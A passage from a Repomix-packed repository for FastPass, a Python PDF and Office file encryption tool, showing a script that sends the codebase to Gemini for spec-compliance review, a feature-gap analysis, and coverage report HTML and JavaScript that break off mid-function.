This file is a merged representation of the entire codebase, combined into a single document by Repomix.

<file_summary>
This section contains a summary of this file.

<purpose>
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.
</purpose>

<file_format>
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  - File path as an attribute
  - Full contents of the file
</file_format>

<usage_guidelines>
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.
</usage_guidelines>

<notes>
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Files are sorted by Git change count (files with more changes are at the bottom)
</notes>

</file_summary>

<directory_structure>
.gitignore
dev/adhoc/create_test_files.py
dev/document_validation_comprehensive_guide.md
dev/fast_pass_specification.md
dev/fastpass_flowchart.html
dev/fastpass_test_design.md
dev/project_status_checker.py
dev/unimplemented_features_analysis.md
fastpass_complete_analysis.xml
main.py
reports/coverage/.gitignore
reports/coverage/class_index.html
reports/coverage/coverage_html_cb_497bf287.js
reports/coverage/function_index.html
reports/coverage/index.html
reports/coverage/status.json
reports/coverage/style_cb_dca529e9.css
reports/coverage/z_145eef247bfb46b6___init___py.html
reports/coverage/z_145eef247bfb46b6___main___py.html
reports/coverage/z_145eef247bfb46b6_app_py.html
reports/coverage/z_145eef247bfb46b6_cli_py.html
reports/coverage/z_6156a86a215061be___init___py.html
reports/coverage/z_6156a86a215061be_config_py.html
reports/coverage/z_6156a86a215061be_logger_py.html
reports/coverage/z_9d0a8317fb892e58___init___py.html
reports/coverage/z_9d0a8317fb892e58_password_manager_py.html
reports/coverage/z_ae6ae744f2ec6f26___init___py.html
reports/coverage/z_ae6ae744f2ec6f26_office_handler_py.html
reports/coverage/z_ae6ae744f2ec6f26_pdf_handler_py.html
reports/coverage/z_ce21df766c911d41___init___py.html
reports/coverage/z_ce21df766c911d41_file_handler_py.html
reports/coverage/z_ce21df766c911d41_security_py.html
requirements.txt
scripts/create_test_pdf.py
scripts/run_tests.py
src/__main__.py
src/app.py
src/cli.py
src/core/__init__.py
src/core/crypto_handlers/__init__.py
src/core/crypto_handlers/office_handler.py
src/core/crypto_handlers/pdf_handler.py
src/core/file_handler.py
src/core/password/__init__.py
src/core/password/password_manager.py
src/core/security.py
src/exceptions.py
src/utils/__init__.py
src/utils/config.py
src/utils/logger.py
test_sample.txt
tests/conftest.py
tests/e2e/__init__.py
tests/e2e/test_complete_workflows.py
tests/fixtures/__init__.py
tests/integration/__init__.py
tests/performance/__init__.py
tests/requirements.txt
tests/security/__init__.py
tests/security/test_attack_simulation.py
tests/test_cli_basic.py
tests/test_integration_basic.py
tests/unit/__init__.py
tests/unit/test_cli_parsing.py
tests/unit/test_security_validation.py
</directory_structure>

<files>
This section contains the contents of the repository's files.

<file path="dev/project_status_checker.py">
#!/usr/bin/env python3
"""
FastPass Project Status Checker
Uses Repomix to analyze the entire codebase and Gemini to verify completion against specification
"""

import subprocess
import tempfile
import os
from pathlib import Path
import sys

def run_command(cmd, description):
    """Run a command and return its output"""
    print(f"[RUNNING] {description}...")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[ERROR] {description} failed:")
            print(f"STDERR: {result.stderr}")
            print(f"STDOUT: {result.stdout}")
            return None
        print(f"[SUCCESS] {description} completed")
        return result.stdout
    except Exception as e:
        print(f"[ERROR] {description} failed with exception: {e}")
        return None

def main():
    """Main execution function"""
    print("FastPass Project Status Checker")
    print("=" * 50)
    
    # Get project root directory (parent of dev folder)
    script_dir = Path(__file__).parent
    project_root = script_dir.parent
    spec_path = script_dir / "fast_pass_specification.md"
    
    print(f"Project root: {project_root}")
    print(f"Specification: {spec_path}")
    
    # Verify specification file exists
    if not spec_path.exists():
        print(f"[ERROR] Specification file not found: {spec_path}")
        sys.exit(1)
    
    # Change to project root directory
    os.chdir(project_root)
    
    # Step 1: Generate repomix analysis of entire codebase
    print("\nGenerating codebase analysis with Repomix...")
    
    # Create temporary file for repomix output
    with tempfile.NamedTemporaryFile(mode='w+', suffix='.xml', delete=False) as temp_file:
        temp_xml_path = temp_file.name
    
    try:
        # Run repomix on the entire project
        repomix_cmd = f'repomix --output "{temp_xml_path}" .'
        repomix_result = run_command(repomix_cmd, "Running Repomix analysis")
        
        if repomix_result is None:
            print("[ERROR] Failed to generate repomix analysis")
            sys.exit(1)
        
        # Step 2: Read specification file
        print(f"\nReading specification file...")
        try:
            with open(spec_path, 'r', encoding='utf-8') as f:
                specification_content = f.read()
            print(f"[SUCCESS] Loaded specification ({len(specification_content)} characters)")
        except Exception as e:
            print(f"[ERROR] Failed to read specification: {e}")
            sys.exit(1)
        
        # Step 3: Prepare Gemini prompt
        print(f"\nPreparing Gemini analysis...")
        
        gemini_prompt = f'''Claude here. I need you to act as a critical, neutral technical reviewer - do not agree by default or be sycophantic. Provide honest, analytical feedback as a critic rather than trying to be agreeable.

I have a FastPass project (universal file encryption/decryption tool) and need you to verify if the implementation matches the specification completely and correctly.

TASK: Compare the actual codebase implementation against the specification and provide:

1. **COMPLETION STATUS**: Is everything from the specification implemented? (Yes/No + details)
2. **CORRECTNESS ANALYSIS**: Are the implementations correct according to spec?
3. **MISSING FEATURES**: List any specified features that are missing or incomplete
4. **IMPLEMENTATION GAPS**: Identify any deviations from the specification
5. **CRITICAL ISSUES**: Any serious problems or security concerns
6. **RECOMMENDATIONS**: Specific actionable items to achieve full compliance

**SPECIFICATION DOCUMENT:**
{specification_content}

**COMPLETE CODEBASE ANALYSIS:**
[The repomix XML will be piped to stdin]

Please provide a thorough, critical analysis focusing on compliance with the specification.'''
        
        # Step 4: Send to Gemini via pipe
        print(f"Sending analysis to Gemini...")
        
        # Construct gemini command with piped input (Windows compatible)
        if os.name == 'nt':
            gemini_cmd = f'type "{temp_xml_path}" | gemini -p "{gemini_prompt}"'
        else:
            gemini_cmd = f'cat "{temp_xml_path}" | gemini -p "{gemini_prompt}"'
        
        gemini_result = run_command(gemini_cmd, "Running Gemini analysis")
        
        if gemini_result:
            print("\n" + "=" * 80)
            print("GEMINI PROJECT STATUS ANALYSIS")
            print("=" * 80)
            print(gemini_result)
            print("=" * 80)
        else:
            print("[ERROR] Failed to get Gemini analysis")
            sys.exit(1)
            
    finally:
        # Cleanup temporary file
        try:
            os.unlink(temp_xml_path)
            print(f"[CLEANUP] Removed temporary file: {temp_xml_path}")
        except Exception as e:
            print(f"[WARNING] Could not clean up temp file {temp_xml_path}: {e}")
    
    print("\n[SUCCESS] Project status check completed!")

if __name__ == "__main__":
    main()
</file>

<file path="dev/unimplemented_features_analysis.md">
# FastPass Unimplemented Features Analysis

**Document Purpose**: This document identifies specific features and sections from the FastPass specification that have NOT been implemented yet, making this project incomplete and non-production-ready.

**Analysis Date**: July 26, 2025  
**Specification Reference**: `dev/fast_pass_specification.md`

---

## Executive Summary

❌ **FastPass is NOT production-ready**. While significant infrastructure and framework code exists, **critical core functionality is missing**, particularly Office document encryption.

**Production Readiness Status**: ~70% complete
- ✅ Infrastructure & Security: Complete
- ✅ PDF Operations: Complete  
- ❌ Office Encryption: **NOT IMPLEMENTED**
- ⚠️ Main Entry Point: Incorrect implementation

---

## Section-by-Section Implementation Analysis

### Section A: CLI Parsing & Initialization
**Status**: ✅ **IMPLEMENTED** (with minor gaps)

| Subsection | Specification Section | Implementation Status | Notes |
|------------|----------------------|----------------------|-------|
| A1a-A1h | CLI Argument Parsing | ✅ Complete | Located in `src/cli.py` |
| A2a-A2b | Argument Validation | ✅ Complete | Recursive mode restrictions implemented |
| A3a-A3e | Logging Setup | ✅ Complete | Multi-handler logging with TTY detection |
| A4a-A4e | Crypto Tool Detection | ✅ Complete | msoffcrypto-tool and PyPDF2 validation |
| A5a-A5g | Application Initialization | ✅ Complete | FastPassApplication class implemented |

**Gap**: Main entry point (`main.py`) contains placeholder code instead of calling actual application.

---

### Section B: Security & File Validation  
**Status**: ✅ **IMPLEMENTED**

| Subsection | Specification Section | Implementation Status | Notes |
|------------|----------------------|----------------------|-------|
| B1-SEC-1 to B1-SEC-6 | Security Validator | ✅ Complete | Enhanced with Windows compatibility |
| B2a-B2e | Path Validation | ✅ Complete | Comprehensive security checks |
| B3a-B3c | File Format Detection | ✅ Complete | Using filetype library |
| B4a-B4d | File Structure Validation | ✅ Complete | Magic number validation |
| B5a-B5c | File Manifest Creation | ✅ Complete | Complete file metadata system |

**Recent Enhancement**: Security policy updated with configurable allowed directories and Windows compatibility.

---

### Section C: Crypto Tool Selection & Configuration
**Status**: ⚠️ **PARTIALLY IMPLEMENTED** 

| Subsection | Specification Section | Implementation Status | Notes |
|------------|----------------------|----------------------|-------|
| C1a-C1d | Crypto Handler Factory | ✅ Complete | Handler selection logic implemented |
| C2a | **Office Encryption** | ❌ **NOT IMPLEMENTED** | **CRITICAL GAP** |
| C2b | Office Decryption | ✅ Complete | Uses msoffcrypto-tool |
| C2c | Office Password Testing | ✅ Complete | Password validation works |
| C3a | PDF Encryption | ✅ Complete | Uses PyPDF2 |
| C3b | PDF Decryption | ✅ Complete | Uses PyPDF2 |
| C3c | PDF Password Testing | ✅ Complete | Password validation works |
| C4a-C4e | Password Management | ✅ Complete | Multi-source password handling |
| C5a-C5d | Password Discovery | ✅ Complete | Password candidate testing |

### **CRITICAL IMPLEMENTATION GAP - Section C2a**

**File**: `src/core/crypto_handlers/office_handler.py:101`  
**Expected Behavior**: Office document encryption using secure library calls  
**Actual Implementation**:
```python
raise NotImplementedError(
    "Office document encryption is not yet implemented. "
    "Use Microsoft Office or LibreOffice to encrypt documents manually."
)
```

**Specification Requirement** (Section C2a):
```python
def encrypt_file_secure(self, input_path: Path, output_path: Path, password: str) -> None:
    """Secure Office encryption using direct library calls (no subprocess)"""
    # [Detailed secure implementation specified but not implemented]
```

**Impact**: **Cannot encrypt Microsoft Office documents** (Word, Excel, PowerPoint) - this is 50% of the tool's core functionality.

---

### Section D: File Processing & Operations
**Status**: ✅ **IMPLEMENTED**

| Subsection | Specification Section | Implementation Status | Notes |
|------------|----------------------|----------------------|-------|
| D1a-D1f | Temp File Management | ✅ Complete | Secure temporary directory handling |
| D2a-D2h | File Processing Pipeline | ✅ Complete | Complete processing workflow |
| D3a-D3f | Crypto Operations | ⚠️ Partial | PDF works, Office encryption missing |
| D4a-D4g | Output Handling | ✅ Complete | In-place and copy modes |

**Note**: File processing infrastructure is complete, but Office encryption operations will fail due to C2a gap.

---

### Section E: Cleanup & Results Reporting
**Status**: ✅ **IMPLEMENTED**

| Subsection | Specification Section | Implementation Status | Notes |
|------------|----------------------|----------------------|-------|
| E1a-E1d | File Cleanup | ✅ Complete | Secure temporary file deletion |
| E2a-E2c | Results Reporting | ✅ Complete | Multiple output formats |
| E3a-E3d | Password Memory Clearing | ✅ Complete | Secure password cleanup |
| E4a-E4b | Exit Code Generation | ✅ Complete | Standardized exit codes |

---

## Missing Core Features

### 1. **Office Document Encryption (CRITICAL)** ❌
- **Section**: C2a 
- **Function**: `encrypt_file_secure()` in `OfficeHandler`
- **Current Status**: Raises `NotImplementedError`
- **Impact**: Cannot encrypt .docx, .xlsx, .pptx files
- **Required Implementation**: 
  - COM automation (Windows)
  - LibreOffice command line (cross-platform)
  - Alternative encryption library

### 2. **Main Application Entry Point** ⚠️
- **File**: `main.py`
- **Current Status**: Placeholder "Hello World" implementation
- **Expected**: Should call `src/__main__.py` or CLI system
- **Impact**: Cannot run application via `python main.py`

### 3. **End-to-End Integration Testing** ⚠️
- **Current Status**: Unit tests exist, E2E tests incomplete
- **Missing**: Tests that actually encrypt/decrypt files and verify results
- **Impact**: No validation that complete workflows work

---

## Implementation Priority for Production Readiness

### **Priority 1 (CRITICAL - Blocking)** 🔴
1. **Office Encryption Implementation** (Section C2a)
   - Research and implement Office encryption method
   - Options: COM automation, LibreOffice CLI, alternative library
   - Estimated effort: 2-3 weeks

2. **Main Entry Point Fix**
   - Fix `main.py` to properly invoke application
   - Estimated effort: 1 hour

### **Priority 2 (HIGH - Important)** 🟡  
3. **End-to-End Testing**
   - Create tests that encrypt then decrypt files
   - Verify file integrity after operations
   - Estimated effort: 1 week

4. **Production Hardening**
   - Error handling edge cases
   - Performance optimization
   - Memory usage optimization
   - Estimated effort: 1 week

---

## Conclusion

**FastPass is a sophisticated, well-architected project with excellent security design, but it lacks the core Office encryption functionality that represents 50% of its value proposition.**

**To achieve production readiness**, the primary blocker is implementing Office document encryption (Section C2a). All other infrastructure is solid and production-quality.

**Current User Impact**:
- ✅ Can decrypt Office documents  
- ✅ Can encrypt/decrypt PDF documents
- ❌ **Cannot encrypt Office documents** (major limitation)
- ⚠️ Cannot run via standard `python main.py` entry point

**Recommendation**: Focus development effort on Section C2a Office encryption implementation to unlock full product functionality.
</file>

<file path="reports/coverage/.gitignore">
# Created by coverage.py
*
</file>

<file path="reports/coverage/class_index.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage report</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="indexfile">
<header>
    <div class="content">
        <h1>Coverage report:
            <span class="pc_cov">74%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>f</kbd>
                        <kbd>n</kbd>
                        <kbd>s</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        <kbd>c</kbd>
                        &nbsp; change column sorting
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <form id="filter_container">
            <input id="filter" type="text" value="" placeholder="filter...">
            <div>
                <input id="hide100" type="checkbox" >
                <label for="hide100">hide covered</label>
            </div>
        </form>
        <h2>
                <a class="button" href="index.html">Files</a>
                <a class="button" href="function_index.html">Functions</a>
                <a class="button current">Classes</a>
        </h2>
        <p class="text">
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</header>
<main id="index">
    <table class="index" data-sortable>
        <thead>
            <tr class="tablehead" title="Click to sort">
                <th id="file" class="name left" aria-sort="none" data-shortcut="f">File<span class="arrows"></span></th>
                <th id="region" class="name left" aria-sort="none" data-default-sort-order="ascending" data-shortcut="n">class<span class="arrows"></span></th>
                <th id="statements" aria-sort="none" data-default-sort-order="descending" data-shortcut="s">statements<span class="arrows"></span></th>
                <th id="missing" aria-sort="none" data-default-sort-order="descending" data-shortcut="m">missing<span class="arrows"></span></th>
                <th id="excluded" aria-sort="none" data-default-sort-order="descending" data-shortcut="x">excluded<span class="arrows"></span></th>
                <th id="coverage" class="right" aria-sort="none" data-shortcut="c">coverage<span class="arrows"></span></th>
            </tr>
        </thead>
        <tbody>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6___init___py.html">src\__init__.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6___init___py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6___main___py.html">src\__main__.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6___main___py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>11</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="11 11">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t18">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t18"><data value='FastPassApplication'>FastPassApplication</data></a></td>
                <td>125</td>
                <td>30</td>
                <td>0</td>
                <td class="right" data-ratio="95 125">76%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t299">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t299"><data value='SecurityViolationError'>SecurityViolationError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t303">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t303"><data value='FileFormatError'>FileFormatError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t307">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t307"><data value='CryptoToolError'>CryptoToolError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t311">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t311"><data value='PasswordError'>PasswordError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t315">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html#t315"><data value='ProcessingError'>ProcessingError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html">src\app.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_app_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>31</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="31 31">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html">src\cli.py</a></td>
                <td class="name left"><a href="z_145eef247bfb46b6_cli_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>100</td>
                <td>19</td>
                <td>0</td>
                <td class="right" data-ratio="81 100">81%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41___init___py.html">src\core\__init__.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41___init___py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26___init___py.html">src\core\crypto_handlers\__init__.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26___init___py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t19">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html#t19"><data value='OfficeDocumentHandler'>OfficeDocumentHandler</data></a></td>
                <td>42</td>
                <td>42</td>
                <td>0</td>
                <td class="right" data-ratio="0 42">0%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html">src\core\crypto_handlers\office_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_office_handler_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>16</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="14 16">88%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t17">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html#t17"><data value='PDFHandler'>PDFHandler</data></a></td>
                <td>52</td>
                <td>15</td>
                <td>0</td>
                <td class="right" data-ratio="37 52">71%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html">src\core\crypto_handlers\pdf_handler.py</a></td>
                <td class="name left"><a href="z_ae6ae744f2ec6f26_pdf_handler_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>14</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="12 14">86%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t22">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t22"><data value='FileFormatError'>FileFormatError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t26">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t26"><data value='ProcessingError'>ProcessingError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t32">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t32"><data value='FileManifest'>FileManifest</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t46">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t46"><data value='FileValidator'>FileValidator</data></a></td>
                <td>57</td>
                <td>17</td>
                <td>0</td>
                <td class="right" data-ratio="40 57">70%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t205">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t205"><data value='FileProcessor'>FileProcessor</data></a></td>
                <td>107</td>
                <td>26</td>
                <td>0</td>
                <td class="right" data-ratio="81 107">76%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t439">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t439"><data value='FileProcessingResult'>FileProcessingResult</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t449">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t449"><data value='FileProcessingError'>FileProcessingError</data></a></td>
                <td>0</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="0 0">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t455">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html#t455"><data value='ResultsReporter'>ResultsReporter</data></a></td>
                <td>33</td>
                <td>2</td>
                <td>0</td>
                <td class="right" data-ratio="31 33">94%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html">src\core\file_handler.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_file_handler_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>54</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="54 54">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58___init___py.html">src\core\password\__init__.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58___init___py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>2</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="2 2">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t12">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html#t12"><data value='PasswordManager'>PasswordManager</data></a></td>
                <td>57</td>
                <td>16</td>
                <td>0</td>
                <td class="right" data-ratio="41 57">72%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html">src\core\password\password_manager.py</a></td>
                <td class="name left"><a href="z_9d0a8317fb892e58_password_manager_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>9</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="9 9">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t16">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html#t16"><data value='SecurityValidator'>SecurityValidator</data></a></td>
                <td>78</td>
                <td>36</td>
                <td>0</td>
                <td class="right" data-ratio="42 78">54%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html">src\core\security.py</a></td>
                <td class="name left"><a href="z_ce21df766c911d41_security_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>15</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="15 15">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be___init___py.html">src\utils\__init__.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be___init___py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>3</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="3 3">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t14">src\utils\config.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_config_py.html#t14"><data value='FastPassConfig'>FastPassConfig</data></a></td>
                <td>32</td>
                <td>14</td>
                <td>0</td>
                <td class="right" data-ratio="18 32">56%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_config_py.html">src\utils\config.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_config_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>20</td>
                <td>0</td>
                <td>0</td>
                <td class="right" data-ratio="20 20">100%</td>
            </tr>
            <tr class="region">
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html">src\utils\logger.py</a></td>
                <td class="name left"><a href="z_6156a86a215061be_logger_py.html"><data value=''><span class='no-noun'>(no class)</span></data></a></td>
                <td>41</td>
                <td>11</td>
                <td>0</td>
                <td class="right" data-ratio="30 41">73%</td>
            </tr>
        </tbody>
        <tfoot>
            <tr class="total">
                <td class="name left">Total</td>
                <td class="name left">&nbsp;</td>
                <td>905</td>
                <td>232</td>
                <td>0</td>
                <td class="right" data-ratio="673 905">74%</td>
            </tr>
        </tfoot>
    </table>
    <p id="no_rows">
        No items found using the specified filter.
    </p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
    <aside class="hidden">
        <a id="prevFileLink" class="nav" href=""></a>
        <a id="nextFileLink" class="nav" href=""></a>
        <button type="button" class="button_prev_file" data-shortcut="["></button>
        <button type="button" class="button_next_file" data-shortcut="]"></button>
        <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
    </aside>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/coverage_html_cb_497bf287.js">
// Licensed under the Apache License: http://www.apache.org/licenses/LICENSE-2.0
// For details: https://github.com/nedbat/coveragepy/blob/master/NOTICE.txt

// Coverage.py HTML report browser code.
/*jslint browser: true, sloppy: true, vars: true, plusplus: true, maxerr: 50, indent: 4 */
/*global coverage: true, document, window, $ */

coverage = {};

// General helpers
function debounce(callback, wait) {
    let timeoutId = null;
    return function(...args) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => {
            callback.apply(this, args);
        }, wait);
    };
};

function checkVisible(element) {
    const rect = element.getBoundingClientRect();
    const viewBottom = Math.max(document.documentElement.clientHeight, window.innerHeight);
    const viewTop = 30;
    return !(rect.bottom < viewTop || rect.top >= viewBottom);
}

function on_click(sel, fn) {
    const elt = document.querySelector(sel);
    if (elt) {
        elt.addEventListener("click", fn);
    }
}

// Helpers for table sorting
function getCellValue(row, column = 0) {
    const cell = row.cells[column]  // nosemgrep: eslint.detect-object-injection
    if (cell.childElementCount == 1) {
        var child = cell.firstElementChild;
        if (child.tagName === "A") {
            child = child.firstElementChild;
        }
        if (child instanceof HTMLDataElement && child.value) {
            return child.value;
        }
    }
    return cell.innerText || cell.textContent;
}

function rowComparator(rowA, rowB, column = 0) {
    let valueA = getCellValue(rowA, column);
    let valueB = getCellValue(rowB, column);
    if (!isNaN(valueA) && !isNaN(valueB)) {
